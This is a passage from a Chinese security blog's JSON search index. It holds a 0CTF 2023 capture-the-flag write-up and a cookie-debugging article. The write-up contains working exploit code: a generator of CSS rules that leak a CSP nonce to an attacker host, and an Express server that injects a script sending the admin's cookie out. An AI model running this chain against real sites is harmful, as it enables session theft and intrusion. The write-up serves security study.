{"pages":[{"title":"","text":"","link":"/404.html"},{"title":"Archives","text":"","link":"/archive/index.html"},{"title":"推薦閱讀","text":"對資安有興趣的話，可以看看： 防止 XSS 可能比想像中困難 淺談 XSS 攻擊與防禦的各個環節 利用 Cookie 特性進行的 DoS 攻擊：Cookie 炸彈 不識廬山真面目：Clickjacking 點擊劫持攻擊 在做跳轉功能時應該注意的問題：Open Redirect 基於 JS 原型鏈的攻擊手法：Prototype Pollution 如果你想看一些比較輕鬆卻又有點深度的文章，我推薦： 搶救茶壺大作戰：418 I am a teapot Don’t break the Web：以 SmooshGate 以及 keygen 為例 覺得 JavaScript function 很有趣的我是不是很奇怪 如果你想看那種追到原始碼或是規格去的深度文，可以參考： 我遇過的最難的 Cookie 問題 從 V8 bytecode 探討 let 與 var 的效能問題 從 React 原始碼看 keyPress 與 keyDown 事件 或者是底下提到的《JavaScript 五講》系列文。 如果你想知道我推薦的前端學習路線還有對路線圖的看法，可以參考： 從 Redux 作者 Dan Abramov 的文章談前端學習路線圖 紮實的網頁前端學習路線與資源推薦 如果你想看一些自己動手做的心得，可以看看： 自己架一個 Online Judge 系統 Medium 爬蟲進化史 記一次幫開源專案 spectrum 修 bug 的經歷 AWS Lambda + GitHub API + Google Sheet &#x3D; 自動化簽到系統 利用 Github Classroom 加 Travis CI 打造改作業系統 想要找到更多類似的文章可以參考文章分類。除此之外，底下有幾個系列文，在寫的時候就已經規劃好了，會比較有系統性一點，也可以參考看看。 CORS 完全手冊花了不少時間才完成的系列文，希望能成為 CORS 系列的經典之一。 CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ CORS 完全手冊（二）：如何解決 CORS 問題？ CORS 完全手冊（三）：CORS 詳解 CORS 完全手冊（四）：一起看規範 CORS 完全手冊（五）：跨來源的安全性問題 CORS 完全手冊（六）：總結、後記與遺珠 JavaScript 五講其實想寫這個系列很久了，是與 JavaScript 有關的的一系列文章，內容大家絕對都聽過，像是 this、closure、hoisting、prototype 等等，希望能透過這五篇文章幫助大家釐清在 JavaScript 中常搞錯的觀念。 該來理解 JavaScript 的原型鍊了 深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？ 我知道你懂 hoisting，可是你了解到多深？ 所有的函式都是閉包：談 JS 中的作用域與 Closure 淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂 若是你比較喜歡影片版的，這邊有付費的相關線上課程：[JS201] 進階 JavaScript：那些你一直搞不懂的地方，但內容跟文章其實沒有差太多，真的看了試看覺得喜歡再買。 Session 與 Cookie 三部曲這是原本就規劃好的系列文，藉由三篇文章由淺入深，最後徹底理解 Sesson 與 Cookie。第一篇是給毫無基礎的初學者看的，第二篇則是給有相關知識的開發者，從 RFC 的角度去看什麼是 Session 與 Cookie，而最後一篇則是去看一些知名框架或程式語言的原始碼，實際理解 Session 與 Cookie 的實作。 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作 除了這幾篇，之前也寫過一篇與 Cookie 相關的，可以一併參考：我遇過的最難的 Cookie 問題。","link":"/recommend/index.html"},{"title":"關於我","text":"想關注部落格文章的話，除了 RSS 以外也可以考慮追蹤這個粉絲專頁：Huli 隨意聊 RSS 的話本站提供三個版本，可以自行選擇想要的版本： 中文版：https://blog.huli.tw/atom-ch.xml 英文版：https://blog.huli.tw/atom-en.xml 中英雙語版：https://blog.huli.tw/atom.xml 想看更多相關文章可以參考另一個生活部落格，想聯絡我的話可以透過 Email：&#x61;&#x73;&#x7a;&#x78;&#x38;&#x37;&#52;&#x31;&#x30;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#109;，網頁右上角也可以找到我的臉書。 原本是個前端工程師，2021 年 5 月開始轉做資安相關的研究，也因為這個背景，對於前端相關的資安議題（XSS、CORS 以及 XSLeaks）特別感興趣。 然而在 2023 年底又轉了回來，再次跑回去做前端。 在生活上是個重度拖延症患者，興趣是光想不做，有很多想做的事，最後都不了了之。無聊的時候喜歡寫寫文章，發現自己好像有把事情講得比其他人清楚的能力，相信分享與交流可以讓世界更美好。 喜歡把常見問題寫成文章，就不用每次被問就回答一次，就跟寫 code 的時候要順便記得重構一樣。 很多想寫的主題都擱置著，因此我把這些主題放在這個地方，有想看到我寫哪個主題的可以按個 upvote 或是留言。 如果你對我怎麼學程式以及相關背景有興趣，可以閱讀： 自學、哲學、講學：我的程式之路 如果你好奇我為什麼寫文章，每寫一篇都花多久，可以閱讀： 廢文工作者的養成 我為什麼寫部落格，以及部落格帶給我的影響 我是如何完成一篇文章的？ 如果你想知道我對學習方面的看法，可以參考： 致跟我一樣的拖延症患者：動力是需要刻意創造的 當我們在學程式時，要學的到底是什麼？ 程式相關問題一網打盡：談自學、轉職、出國、職涯、教學、補習、騙錢、產業以及努力 用對你有效的學習方法，無論那是什麼 打造「正確」學習 mindset 如果你對我的工作經歷有興趣，可以看看： 一個工程師的履歷進化史 成為前端工程師的四週年回顧 Linkedin 演講與投影片整理一下之前去過的研討會或是給過的一些 talk，避免每次要找的時候都不知道去哪裡找。 CYBERSEC 2022 - 不需要 JS 的前端攻擊手法 - CSS injection談到網頁前端安全，第一個想到的幾乎都是 XSS，一種利用 JavaScript 的攻擊手法。有許多人都以為只要阻止 JavaScript 執行就足夠了，但事實上還可以透過其他方式攻擊，例如說 iframe 或甚至是拿來裝飾網頁的 CSS！ 在本場講題中，我會介紹 CSS injection 這個較少人提及的攻擊手法，讓攻擊者藉由 CSS 來偷取網頁上的文字以及敏感資料，例如說可以偷取 CSRF token，再用這組 token 進行 CSRF 攻擊，來繞過原本 CSRF 的防範機制。 最後我會以知名開源協作筆記軟體作為實際案例，來探討 CSS injection 的攻擊與防禦。 研討會連結：https://cyber.ithome.com.tw/2022/session-page/692投影片：https://speakerdeck.com/aszx87410/attacking-web-without-js-css-injection Sharing at TrendMicro - Front-end Security that Front-end developers don’t know這是我之前去趨勢內部分享的一個講題，主要是有關於前端資訊安全，談到了一些經典的主題像是 XSS, CSP, CSRF 以及 XSLeaks 等等 投影片：https://speakerdeck.com/aszx87410/front-end-security-that-front-end-developers-dont-know ModernWeb 2021 - 接觸資安才發現前端的水真深當了五年前端工程師的我，在前陣子因緣際會轉到了資訊安全的部門，開始研究起各式各樣的攻擊手法。原本我自認為對前端以及 JS 還算熟悉，該看的都看過了，直到我接觸了資安以及 CTF，才發現我太天真了。在這場講題中，我會分享我從資安重新學習到的前端知識，跟大家一起從新的領域重新認識一些有趣好玩的前端特性。 研討會連結：https://modernweb.ithome.com.tw/session-inner#457投影片：https://speakerdeck.com/aszx87410/jie-chu-zi-an-cai-fa-xian-qian-duan-de-shui-zhen-shen-modern-web-2021 MOPCON 2021 - 你懂了 JavaScript，也不懂 JavaScriptJavaScript 中有幾個主題，常出現在面試考題裡面，像是 type、hoisting、this、scope 或是 prototype 等等。有許多新手學這些是因為面試會考，但工作之後也沒有體會到除了應付考試，為何要學習這些。 儘管有些主題前輩說要學，但為何在工作上從來沒有碰過需要它的地方？那它到底是重要，還是不重要呢？ 在這場演講中我希望以實際案例帶大家去探索，這些被稱為 JavaScript 核心的知識，哪些只是俗濫的面試考題，哪些又是真的有價值的。 研討會連結：https://mopcon.org/2021/schedule/2021006投影片：https://speakerdeck.com/aszx87410/ni-dong-liao-javascript-ye-bu-dong-javascript-mopcon-2021 JSDC 2020 - 用 API mocking 讓前端不再苦苦等待在開發上比較理想的狀況是後端先行，等後端 API 差不多以後前端再進來，這時候就可以直接串接 API。但現實上很常發生前後端同步開發的狀況，有時候前端就必須等後端開發完畢，才能開始進行後續動作。 為了避免這種苦苦等待的狀況，我會介紹一些好用的 API mocking library，讓大家自己先 mock API，讓前端超前部署！ 研討會連結：https://2020.jsdc.tw/agenda/投影片：https://speakerdeck.com/aszx87410/jsdc2020-yong-api-mocking-rang-qian-duan-bu-zai-ku-deng-dai ModernWeb 2018 - 輕鬆應付複雜的非同步操作：RxJS + Redux ObservableReactive Programming 近幾年在處理非同步事件上成為顯學，無論是 JavaScript、Java 或是 Swift，都能看到它的蹤影。所以演說的第一部份會介紹 RxJS 的基本概念跟常用的 operator，藉由幾個小範例讓大家看見 RxJS 在處理非同步上的厲害之處。 而 React 作為一套 UI library，在處理 API call 時往往需要依靠 Redux 來做狀態的管理，而搭配的解決方案又有好多種，像是 redux-thunk 或 redux-saga 等等。這次要介紹的 redux-observable 是一套利用 RxJS 來處理非同步 Action 的解決方案，因此第二部分會講到 redux-observable 的基本使用以及核心概念，最後講到如何用 RxJS 處理複雜的 API call。 研討會連結：https://modernweb.tw/2018/agenda.html投影片：https://speakerdeck.com/aszx87410/modernweb-2018-qing-song-ying-fu-fu-za-de-fei-tong-bu-cao-zuo-rxjs-plus-redux-observable 關於部落格經歷過無數次的搬家之後，決定在這邊定居，因為終於找到了一個喜歡的佈景主題。希望不要再搬了。 此部落格採用 Hexo + Minos theme + GitHub Pages 架設而成。有改過 Minos 裡面的一些東西，例如說字體大小、文章列表以及分類頁面等等，改過的版本在這邊：aszx87410&#x2F;hexo-theme-minos。 這邊是跟技術比較相關的文章，其他文章會放在我的另一個部落格。 雖然說前面有提到「搬家」，但其實沒有把所有文章都搬過來，有稍微篩選過一下，舊的文章都還留在Logdown，因為早期的文章偏筆記類型，所以就沒有搬過來了。","link":"/about/index.html"}],"posts":[{"title":"0CTF 2023 筆記","text":"今年的 0CTF 一共有三道 web 題，其中一道題目是 client-side 的，我就只解這題而已，順利拿到 first blood，這篇簡單記錄一下心得。 關鍵字列表： CSS injection CSS exfiltration Web - newdiary (14 solves)題目就是個典型的 note app，可以建立筆記然後回報給 admin bot，筆記只有限制長度，並沒有做過濾，在 client 也是直接用 innerHTML，所以很明顯有 HTML injection： load = () => &#123; document.getElementById(\"title\").innerHTML = \"\" document.getElementById(\"content\").innerHTML = \"\" const param = new URLSearchParams(location.hash.slice(1)); const id = param.get('id'); let username = param.get('username'); if (id &amp;&amp; /^[0-9a-f]+$/.test(id)) &#123; if (username === null) &#123; fetch(`/share/read/$&#123;id&#125;`).then(data => data.json()).then(data => &#123; const title = document.createElement('p'); title.innerText = data.title; document.getElementById(\"title\").appendChild(title); const content = document.createElement('p'); content.innerHTML = data.content; document.getElementById(\"content\").appendChild(content); &#125;) &#125; else &#123; fetch(`/share/read/$&#123;id&#125;?username=$&#123;username&#125;`).then(data => data.json()).then(data => &#123; const title = document.createElement('p'); title.innerText = data.title; document.getElementById(\"title\").appendChild(title); const content = document.createElement('p'); content.innerHTML = data.content; document.getElementById(\"content\").appendChild(content); &#125;) &#125; document.getElementById(\"report\").href = `/report?id=$&#123;id&#125;&amp;username=$&#123;username&#125;`; &#125; window.removeEventListener('hashchange', load); &#125; load(); window.addEventListener('hashchange', load); 這邊值得注意的一點是如果改變 hash 的話會載入新的 note，這點滿重要的。 而 CSP 的部份如下： &lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-&lt;%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com\"> 每一個 response 都有不同的 nonce，長度為 32 位，每一個字元是 a-zA-Z0-9，有 36 種組合。CSS 的部分允許 inline 跟 unpkg，因為 unpkg 就只是去 npm 上拿，所以可以想成是允許任何的外部 style。 admin bot 的部份只能訪問 /share/read，訪問後會停留 30 秒，這個 timeout 應該滿明顯是要花時間 leak 什麼東西： await page.goto( `http://localhost/share/read#id=$&#123;id&#125;&amp;username=$&#123;username&#125;`, &#123; timeout: 5000 &#125; ); await new Promise((resolve) => setTimeout(resolve, 30000)); await page.close(); 對了，flag 在 cookie 裡面，所以目標是 XSS。 其實看完題目之後我覺得滿直覺的，很明顯要想辦法用 CSS 偷到 nonce，偷到 nonce 以後建立一個新的 note，然後改變 hash 去載入新的 note，就可以 XSS。 但有一些小細節要注意就是了，像是 admin bot 只能訪問某一個筆記，所以要先用 &lt;meta&gt; redirect 到自己的 server，再用 window.open 去打開新的筆記，這樣偷到 nonce 以後才能藉由改變 hash 去更新內容，確保 nonce 不會變。 總之呢，流程如下： 新增一個 note，內容為 &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=https://my_server&quot;&gt;，id 是 0 新增另一個 note，內容為 &lt;style&gt;@import &quot;https://unpkg.com/pkg/steal.css&quot;&lt;/style&gt;，id 是 1 讓 admin bot 訪問 id 是 0 的 note admin bot 被導到 my server，此時可以在我的 origin 執行任意 JavaScript 執行 w = window.open(note_1)，開始偷 nonce 拿到偷來的 nonce 新增最後一個 note，內容為 &lt;script nonce=xxx&gt;&lt;/script&gt;，id 為 2 執行 w.location = &#39;.../share/read#id=2&#39; XSS 這之中最麻煩的部分就在於用 CSS 偷 nonce 了。 用 CSS 偷 nonce我以前剛好有研究過用 CSS 偷東西：用 CSS 來偷資料 - CSS injection（上），但裡面講到的做法其實這一題行不通。 由於 nonce 的可能性有太多種，所以一個字元一個字元偷是最快的方法，但這種做法要利用 @import 加上 blocking 的方式，這一題的外部連結只能到 unpkg，是靜態檔案，沒辦法。 另一種做法剛好前陣子才看過但還沒更新到文章：Code Vulnerabilities Put Proton Mails at Risk 這做法滿聰明的，把一段字切成很多小字串，每個字串有三個字元，我們對 a-zA-Z0-9 做三個字的全排列組合，像這樣： script[nonce*=\"aaa\"]&#123;--aaa:url(\"https://server/leak?q=aaa\")&#125; script[nonce*=\"aab\"]&#123;--aab:url(\"https://server/leak?q=aab\")&#125; ... script[nonce*=\"ZZZ\"]&#123;--ZZZ:url(\"https://server/leak?q=ZZZ\")&#125; script&#123; display: block; background-image: -webkit-cross-fade( var(--aaa, none), -webkit-cross-fade( var(--aab, none), var(--ZZZ, none), 50% ), 50% ) 用 -webkit-cross-fade 是為了要載入多個圖片，細節可以參考上面貼的文章。 例如說 nonce 是 abc123 好了，server 就會收到： abc bc1 c12 123 這四種字串，而順序可能會不一樣，但只要按照規則組合起來，就可以得到 abc123。當然，也有可能會有多種組合或是不確定頭尾的情形，但那就當作 edge case，重新再試一次就行了。 用這樣的方式偷 nocne，以這題來說會有 36^3 &#x3D; 46656 個規則，是可以接受的長度。 產生 CSS剛好之前在工作上也碰到類似的情境，所以手邊已經有寫好的腳本了，改一下就可以用。 這題如果把全部規則都套在同一個元素上，似乎會因為規則太多之類的讓 Chrome 直接 crash（至少我本地是這樣），所以我就把規則分三份，順便套在三個不同元素。 const fs = require('fs') let chars = 'abcdefghijklmnopqrstuvwxyz0123456789' const host = 'https://ip.ngrok-free.app' let arr = [] for(let a of chars) &#123; for(let b of chars) &#123; for(let c of chars) &#123; let str = a+b+c; arr.push(str) &#125; &#125; &#125; let payload1 = '' let crossPayload1 = 'url(\"/\")' let payload2 = '' let crossPayload2 = 'url(\"/\")' let payload3 = '' let crossPayload3 = 'url(\"/\")' const third = Math.floor(arr.length / 3); const arr1 = arr.slice(0, third); const arr2 = arr.slice(third, 2 * third); const arr3 = arr.slice(2 * third); for(let str of arr1) &#123; payload1 += `script[nonce*=\"$&#123;str&#125;\"]&#123;--$&#123;str&#125;:url(\"$&#123;host&#125;/leak?q=$&#123;str&#125;\")&#125;\\n` crossPayload1 = `-webkit-cross-fade($&#123;crossPayload1&#125;, var(--$&#123;str&#125;, none), 50%)` &#125; for(let str of arr2) &#123; payload2 += `script[nonce*=\"$&#123;str&#125;\"]&#123;--$&#123;str&#125;:url(\"$&#123;host&#125;/leak?q=$&#123;str&#125;\")&#125;\\n` crossPayload2 = `-webkit-cross-fade($&#123;crossPayload2&#125;, var(--$&#123;str&#125;, none), 50%)` &#125; for(let str of arr3) &#123; payload3 += `script[nonce*=\"$&#123;str&#125;\"]&#123;--$&#123;str&#125;:url(\"$&#123;host&#125;/leak?q=$&#123;str&#125;\")&#125;\\n` crossPayload3 = `-webkit-cross-fade($&#123;crossPayload3&#125;, var(--$&#123;str&#125;, none), 50%)` &#125; payload1 = `$&#123;payload1&#125; script&#123;display:block;&#125; script&#123;background-image: $&#123;crossPayload1&#125;&#125;` payload2 = `$&#123;payload2&#125;script:after&#123;content:'a';display:block;background-image:$&#123;crossPayload2&#125; &#125;` payload3 = `$&#123;payload3&#125;script:before&#123;content:'a';display:block;background-image:$&#123;crossPayload3&#125; &#125;` fs.writeFileSync('exp1.css', payload1, 'utf-8'); fs.writeFileSync('exp2.css', payload2, 'utf-8'); fs.writeFileSync('exp3.css', payload3, 'utf-8'); 接著把跑完的檔案發佈到 npm，就有一個 unpkg 的網址了。 Exploit寫得滿亂的有點懶得整理，但基本上跑起來以後訪問 /start 就會開始自動跑整個流程。 這題因為運氣好之前就有看過那篇文章，所以開賽後半小時就大概知道怎麼解了，剩下兩小時都在寫 code 😆 import express from 'express' import &#123;fetch, CookieJar&#125; from \"node-fetch-cookies\"; const app = express() const port = 3000 const host = 'http://new-diary.ctf.0ops.sjtu.cn' const selfHost = 'https://ip.ngrok-free.app' const cssUrl = 'https://unpkg.com/your_pkg@1.0.0' const getRandomStr = len => Array(len).fill().map(_ => Math.floor(Math.random()*16).toString(16)).join('') let leaks = [] let cookieJar = new CookieJar(); let username = ''; let hasToken = false; function mergeWords(arr, ending) &#123; if (arr.length === 0) return ending if (!ending) &#123; for(let i=0; i&lt;arr.length; i++) &#123; let isFound = false for(let j=0; j&lt;arr.length; j++) &#123; if (i === j) continue let suffix = arr[i][1] + arr[i][2] let prefix = arr[j][0] + arr[j][1] if (suffix === prefix) &#123; isFound = true continue &#125; &#125; if (!isFound) &#123; console.log('ending:', arr[i]) return mergeWords(arr.filter(item => item!==arr[i]), arr[i]) &#125; &#125; console.log('Error, please try again') return &#125; let found = [] for(let i=0; i&lt;arr.length; i++) &#123; let length = ending.length let suffix = ending[0] + ending[1] let prefix = arr[i][1] + arr[i][2] if (suffix === prefix) &#123; found.push([arr.filter(item => item!==arr[i]), arr[i][0] + ending]) &#125; &#125; return found.map((item) => &#123; return mergeWords(item[0], item[1]) &#125;) &#125; function handleLeak() &#123; let str = '' let arr = [...leaks] leaks = [] console.log('received:', arr) const merged = mergeWords(arr, null); console.log('leaked:', merged.flat(99)) return merged.flat(99) &#125; async function createNote(title, content)&#123; return await fetch(cookieJar, host + '/write', &#123; method: 'POST', headers: &#123; 'content-type': 'application/x-www-form-urlencoded', &#125;, body: `title=$&#123;encodeURIComponent(title)&#125;&amp;content=$&#123;encodeURIComponent(content)&#125;` &#125;) &#125; async function getNotes() &#123; return await fetch(cookieJar, host + '/', &#123; &#125;).then(res => res.text()) &#125; async function share(id) &#123; return await fetch(cookieJar, host + '/share_diary/' + id, &#123; &#125;).then(res => res.text()) &#125; async function report(username, id) &#123; return await fetch(cookieJar, `$&#123;host&#125;/report?username=$&#123;username&#125;&amp;id=$&#123;id&#125;` , &#123; &#125;).then(res => res.text()) &#125; app.get('/', (req, res) => &#123; res.send('Hello World!') &#125;) app.get('/start', async (req, res) => &#123; // create ccount username = getRandomStr(8) let password = getRandomStr(8) leaks = [] hasToken = false console.log(&#123; username, password &#125;) const response = await fetch(cookieJar, host + '/login', &#123; method: 'post', headers: &#123; 'content-type': 'application/x-www-form-urlencoded' &#125;, body: `username=$&#123;username&#125;&amp;password=$&#123;password&#125;` &#125;) const resp = await createNote('note1', `&lt;meta http-equiv=\"refresh\" content=\"0;URL=$&#123;selfHost&#125;/exp\">`) await createNote('note2', `&lt;style>@import \"$&#123;cssUrl&#125;/exp1.css\";@import \"$&#123;cssUrl&#125;/exp2.css\";@import \"$&#123;cssUrl&#125;/exp3.css\";&lt;/style>`) console.log('done') await share(0) await share(1) console.log('report username:', username) console.log(await report(username, 0)) res.send('done') &#125;) app.get('/leak', async (req, res) => &#123; leaks.push(req.query.q) console.log('recevied:', req.query.q, leaks.length) if (leaks.length === 30) &#123; const result = handleLeak() // create a new note await createNote( 'note3', result.map(nonce => `&lt;iframe srcdoc=\"&lt;script nonce=$&#123;nonce&#125;>top.location='$&#123;selfHost&#125;/flag?q='+encodeURIComponent(top.document.cookie)&lt;/script>\">&lt;/iframe>`) ); await share(2) hasToken = true; console.log('note3 cteated') &#125; res.send('ok') &#125;) app.get('/flag', (req, res) => &#123; console.log('flag', req.query.q) res.send('flag') &#125;) app.get('/hasToken', (req, res) => &#123; console.log('polling...', hasToken) if (hasToken) &#123; res.send('hasToken') &#125; else &#123; res.send('no') &#125; &#125;) app.get('/exp', (req, res) => &#123; console.log('visit exp') res.setHeader('content-type', 'text/html') res.send(` &lt;script> let w = window.open('http://localhost/share/read#id=1&amp;username=$&#123;username&#125;') function polling() &#123; fetch('/hasToken').then(res => res.text()).then((res) => &#123; if (res === 'hasToken') &#123; w.location = 'http://localhost/share/read#id=2&amp;username=$&#123;username&#125;' &#125; &#125;) setTimeout(() => &#123; polling(); &#125;, 500) &#125; polling() &lt;/script> `) &#125;) app.listen(port, () => &#123; console.log(`Example app listening on port $&#123;port&#125;`) &#125;) 話說如果沒看過那篇文章的話，不確定自己是不是能想到這個解法 😅","link":"/2023/12/11/0ctf-2023-writeup/"},{"title":"我遇過的最難的 Cookie 問題","text":"前言幾個禮拜前我在工作上碰到了一些跟 Cookie 有關的問題，在這之前，我原本想說：Cookie 不就那樣嘛，就算有些屬性不太熟悉，上網找一下資料就好了，哪有什麼跟 Cookie 有關的難題？ 然而事實證明我錯了。我還真的碰到了一個讓我解超久的 Cookie 問題。 相信看到這邊，很多人應該躍躍欲試了，那我就先來考一下大家： 什麼情形下，Cookie 會寫不進去？ 像是語法錯誤那種顯而易見的就不用說了，除此之外你可能會答說：寫完全不同 domain 的 Cookie。例如說你的網頁在 http://a.com 卻硬要寫 http://b.com 的 Cookie，這種情形當然寫不進去。 或者，你可能會回答：不在 https 卻想加上 Secure flag 的 Cookie。沒錯，像是這種情形也會寫不進去。 除了這些，你還能想到什麼嗎？ 如果想不太到，那就聽我娓娓道來吧！ 悲劇的開始在一個月前我寫了一篇跟 CSRF 有關的文章（讓我們來談談 CSRF），正是因為工作上需要實作 CSRF 的防禦，所以趁機研究了一下。簡單來說，就是要在 Cookie 設置一個 csrftoken。 可是那天我卻發現，我怎麼寫都寫不進去。 我的測試網站的網址是：http://test.huli.com，拿來寫 Cookie 的 script 是： document.cookie = \"csrftoken=11111111; expires=Wed, 29 Mar 2020 10:03:33 GMT; domain=.huli.com; path=/\" 我就只是想對.huli.com寫一個名稱是csrftoken的 Cookie。而我碰到的問題，就是怎麼寫都寫不進去。 這段語法完全沒有問題，我檢查過好幾遍了，但就是不知道為什麼寫不進去。我們開頭講的那幾種 case 這邊都完全沒碰到。這只是一個簡單的 http 網站，而且是寫自己 domain 的 Cookie，怎麼會寫不進去？ 剛開始碰到這情形，我還想說會不會是我電腦的靈異現象，在其他人的電腦上就好了，就暫時沒有管它，直到有一天 PM 跟我說：「咦，這個頁面怎麼壞了？」，我仔細檢查後才發現是因為他也寫不進去這個 Cookie，導致 server 沒有收到 csrftoken 而驗證失敗。 好了，看來現在已經確認不是我電腦上的問題了，而是大家都會這樣。可是，卻有其他人是正常的。其他人都可以，但就只有我跟 PM 兩個人不行。 幸好見過小風小浪的我知道，每次碰到這種詭異的問題，先開無痕模式再說，至少可以知道你的瀏覽器不會被其他因素給干擾。打開無痕模式之後發現，可以了，可以設定 Cookie 了。在一般情況下不行設定，但是開無痕瀏覽模式卻可以。 這就真的很奇怪了，到底為什麼不行呢？而且若是我把 Cookie 換了一個名字，叫做csrftoken2，就可以寫入了！就唯獨csrftoken這個名稱不行，可是 Cookie 總不可能有保留字這種東西吧！就算真的有，csrftoken也絕對不會是保留字。 這一切都太詭異了，到底csrftoken這個名字有什麼問題？到底為什麼寫不進去？ 於是我就去拜了 Google 大神，用cookie 不能寫、cookie can not set、unable set cookie等等的關鍵字去搜尋，卻都一無所獲，找到的答案都跟我的情況完全不一樣。 我用 Chrome devtool 看了，明明http://test.huli.com就沒有任何的 Cookie，怎麼會寫不進去呢？ 在經歷過一陣亂找資料之後，我還稍微去翻了 cookie 的 rfc：HTTP State Management Mechanism，但還是沒有找到相關資料。 最後不知道哪來的靈感，我就去 Chrome 的設定那邊檢視所有 huli.com 的 Cookie，並且一個一個看過之後刪掉。刪完之後，就可以正常寫入 Cookie 了。 仔細想想其實還滿合理的，畢竟無痕模式可以，就代表是以前做的一些事情會影響到寫 Cookie 這件事，再經由刪除 Cookie 就可以確認問題一定是出在其他有關的 Domain 身上，推測是其他 Domain 做了一些事情，才會造成 http://test.huli.com 沒辦法寫入 Cookie。 後來我回想起剛剛刪掉的那幾個 Cookie，發現存在一個也叫做csrftoken的同名 cookie。 撥雲見日難得讓我找到了一點線索，當然要跟著這條線索繼續查下去。 回想了一下，發現是另外一個負責後台管理的網站叫做：https://admin.huli.com寫的，因為是用 django的關係，所以開啟 CSRF 防護之後預設的 Cookie 名稱就是csrftoken。 仔細再用 Chrome devtool 看了一下，這個 Cookie 設置了Secure，Domain是 .admin.huli.com。看起來也沒什麼異狀。 然而，在拜訪這個網站之後，我再試著去 http://test.huli.com，發現又沒辦法寫入 Cookie 了，甚至原本的 Cookie 也離奇地消失了。 太棒了！看來我離真相越來越近了！ 我把這個.admin.huli.com的同名 Cookie 刪掉之後，去拜訪我自己的http://test.huli.com，發現一切都正常。Cookie 可以正常寫入。 看來答案很明顯了，那就是： 只要.admin.huli.com的那個同名 Cookie 存在，http://test.huli.com就沒辦法對.huli.com寫入同名的 Cookie。 解法其實到這邊就很明顯了，第一個是改一個 Cookie 名稱，第二個是改一個 Domain。 有關於第二個解法，還記得我們在 http://test.huli.com 是寫入 .huli.com 這個 Domain 的 Cookie 嗎？只要改成寫入 .test.huli.com 這個 Domain，一樣可以正常運作。 所以若是講得更詳細一點，這個寫不進去 Cookie 的問題就發生在： 當有一個 Domain 為.admin.huli.com並設置成Secure的 Cookie 已經存在的時候，http://test.huli.com就沒辦法對.huli.com寫入同名的 Cookie。 在大概確認問題以後，我就開始調整各個變因，看能不能查出到底是哪一個環節出了問題，最後我發現兩個重點： 其實只有 Chrome 不能寫，Safari, Firefox 都可以 Secure 這個 flag 沒有設置的話，就可以寫 深入追查既然有了只有 Chrome 會發生這種情形的這個有力線索，就可以循著這條線繼續追查下去，那怎麼追查呢？ 沒錯，就是最簡單直接的方法：去找 Chromium 的原始碼！ 以前看過很多文章都是查問題查一查最後查到 Source code 去，終於輪到我也有這一天了。可是 Chromium 的原始碼這麼一大包，該如何找起呢？ 於是我決定先 Google：chromium cookie，在第一筆搜尋結果發現了很有幫助的資料：CookieMonster。這篇文章有詳細說明了 Chromium 的 Cookie 機制是怎麼運作的，並且說明核心就是一個叫做 CookieMonster 的東西。 再來就可以直接去看 Source code 了，可以在 /net/cookies 找到 cookie_monster.cc。 還記得剛剛發現的問題重點之一，推測是跟Secure這個 flag 有關，所以直接用 Secure 當關鍵字下去搜尋，可以在中間的部分發現一個 DeleteAnyEquivalentCookie 的 function，以下節錄部分原始碼，1625 行到 1647 行： // If the cookie is being set from an insecure scheme, then if a cookie // already exists with the same name and it is Secure, then the cookie // should *not* be updated if they domain-match and ignoring the path // attribute. // // See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone if (cc->IsSecure() &amp;&amp; !source_url.SchemeIsCryptographic() &amp;&amp; ecc.IsEquivalentForSecureCookieMatching(*cc)) &#123; skipped_secure_cookie = true; histogram_cookie_delete_equivalent_->Add( COOKIE_DELETE_EQUIVALENT_SKIPPING_SECURE); // If the cookie is equivalent to the new cookie and wouldn't have been // skipped for being HTTP-only, record that it is a skipped secure cookie // that would have been deleted otherwise. if (ecc.IsEquivalent(*cc)) &#123; found_equivalent_cookie = true; if (!skip_httponly || !cc->IsHttpOnly()) &#123; histogram_cookie_delete_equivalent_->Add( COOKIE_DELETE_EQUIVALENT_WOULD_HAVE_DELETED); &#125; &#125; &#125; 這邊很貼心的幫你加上了註釋，說是： 如果有個 cookie 是來自 insecure scheme，並且已經存在一個同名又設置為 Secure 又 domain-match 的 cookie 的話，這個 cookie 就不該被設置 雖然不太理解 domain-match 指的到底是怎樣才算 match，但看來我們碰到的寫不進去 Cookie 的問題就是在這一段發生的。而且還有貼心附上參考資料：https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone標題為：「Deprecate modification of ‘secure’ cookies from non-secure origins」。 內容不長，很快就可以看完，以下節錄其中一小段： Section 8.5 and Section 8.6 of [RFC6265] spell out some of the drawbacks of cookies&#39; implementation: due to historical accident, non-secure origins can set cookies which will be delivered to secure origins in a manner indistinguishable from cookies set by that origin itself. This enables a number of attacks, which have been recently spelled out in some detail in [COOKIE-INTEGRITY]. 附註中的參考資料是這個：Cookies Lack Integrity: Real-World Implications，裡面有附一段二十幾分鐘的影片，可以看一看，看完之後就會知道為什麼不能寫入了。 如果你還沒看，這邊可以幫大家做一個總結。要知道為什麼剛開始那個 case 不能寫入 Cookie，可以先想想看如果可以寫入，會發生什麼事情。 假如 http://test.huli.com 成功寫入 .huli.com 的 csrftoken 這個 cookie 的話，對 http://test.huli.com 似乎沒什麼影響，就多帶一個 Cookie 上去，看起來合情合理。 可是呢，卻對 https://admin.huli.com 有些影響。 原本 .admin.huli.com 並且設置為 Secure 的 Cookie 還是會在，但現在多了個 .huli.com 又是同名的 Cookie。當 https://admin.huli.com 送 request 的時候，就會把這兩個 Cookie 一併帶上去。所以 Server 收到的時候可能會是這樣： csrftoken&#x3D;cookie_from_test_huli_com; csrftoken&#x3D;cookie_from_admin_huli_com 但碰到同名 Cookie 的時候，很多人都會只取第一個處理，所以 Server side 收到的 csrftoken 就會是 cookie_from_test_huli_com。 意思就是說，儘管你在 https://admin.huli.com 用 Secure 的方式寫了一個 Cookie，卻被其他不安全的來源（http://test.huli.com）給覆蓋過去了！ 那蓋掉 Cookie 